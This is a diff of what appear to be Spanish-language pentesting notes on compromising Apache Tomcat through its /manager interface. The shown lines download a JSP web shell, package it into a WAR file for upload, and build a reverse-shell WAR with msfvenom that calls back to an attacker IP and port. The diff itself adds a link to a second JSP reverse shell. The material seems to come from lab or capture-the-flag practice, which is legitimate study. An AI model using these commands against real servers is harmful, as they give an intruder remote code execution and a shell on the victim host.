@@ -25,7 +25,7 @@ https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.
 #Una vez tengamos acceso a /manager podemos deployar una aplicacion subiendo un archivo WAR. El del link es un JSP web shell que se puede agregar a un WAR
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp 
-#Se sube el backuo.war con el cmd.jsp agregado
+#Se sube el backuo.war con el cmd.jsp agregado. Rev shell: https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/main/shell.jsp
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
 #WAR malicious con msfvenom. Este WAR genera directamente una reverse shell
